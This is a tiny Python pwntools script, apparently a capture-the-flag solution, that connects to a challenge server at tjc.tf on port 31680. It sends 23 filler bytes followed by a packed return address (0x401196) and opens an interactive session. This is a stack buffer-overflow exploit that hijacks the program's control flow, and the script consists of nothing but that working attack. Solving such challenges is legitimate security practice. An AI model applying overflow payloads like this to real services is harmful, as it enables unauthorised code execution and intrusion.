from pwn import remote

s = ""
for c in range(1, 16 + 7 + 1):
    s += chr(c + 0x20)
s += '\x96\x11\x40\x00\x00\x00\x00\x00'
r = remote("tjc.tf", 31680)
r.sendline(s.encode())
r.interactive()
